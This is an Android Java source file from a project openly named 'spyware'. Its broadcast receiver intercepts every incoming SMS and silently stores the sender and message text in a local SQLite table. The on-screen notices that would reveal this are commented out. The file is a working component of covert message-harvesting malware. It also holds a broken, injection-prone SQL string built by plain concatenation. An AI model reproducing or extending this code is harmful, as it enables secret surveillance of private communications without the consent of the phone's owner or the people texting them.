package com.example.administrator.spyware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.service.carrier.CarrierMessagingService;
import android.telephony.SmsMessage;
import android.widget.Toast;

/**
 * Created by Administrator on 12/21/2015.
 */
public class MyBroadcastReceiver extends BroadcastReceiver{
    public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(ACTION)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
                for (SmsMessage message : messages) {

                    String strMessageFrom = message.getDisplayOriginatingAddress();
                    String strMessageBody = message.getDisplayMessageBody();

                    //Toast.makeText(context, "SMS Message received from:" + strMessageFrom, Toast.LENGTH_LONG).show();
                    //Toast.makeText(context, "SMS Message content" + strMessageBody, Toast.LENGTH_LONG).show();
                 /*   Intent i=new Intent("broadcast");
                    i.putExtra("SmsContent",strMessageBody);
                    i.putExtra("SmsFrom",strMessageFrom);
                    context.sendBroadcast(i);*/
                    Database db=new Database(context);
                    String query="INSERT INTO thongtin VALUES(null"+","+strMessageBody+","+strMessageFrom+")";
                    db.Query_Data("CREATE TABLE IF NOT EXISTS thongtin(_id INTEGER PRIMARY KEY,noidung VARCHAR(200) NOT NULL,nguoigui VARCHAR(200) NOT NULL)");
                  //  db.Query_Data("INSERT INTO thongtin VALUES(null,SmsContent,SmsFrom)");
                    Item i=new Item(strMessageBody,strMessageFrom);
                    db.add(i,"thongtin");


                }
            }
        }
    }
}


